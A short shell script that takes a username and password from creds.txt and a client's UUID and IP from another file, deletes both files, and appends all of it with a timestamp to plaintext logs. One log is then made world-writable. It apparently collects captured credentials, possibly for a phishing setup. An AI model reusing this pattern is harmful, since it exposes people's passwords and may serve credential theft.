python3 cred.py
usr=$(head -n 1 creds.txt)
passwd=$(sed -n '2{p;q;}' creds.txt)
uuid=$(sed -n '5p' datafromclient.txt)
ip=$(sed -n '2p' datafromclient.txt)
rm datafromclient.txt
rm creds.txt
echo $usr
echo $passwd
set +o noclobber
printf "{ \n UUID: $uuid \n IP: $ip \n USR: $usr \n PASSWD: $passwd \n DATE: $(date +"%m %d %Y %H:%M:%S") \n }, \n" >> data.txt
printf "{ \n UUID: $uuid \n IP: $ip \n USR: $usr \n PASSWD: $passwd \n DATE: $(date +"%m %d %Y %H:%M:%S") \n }, \n" >> tempdata.txt
sudo chmod -R a+rwx tempdata.txt
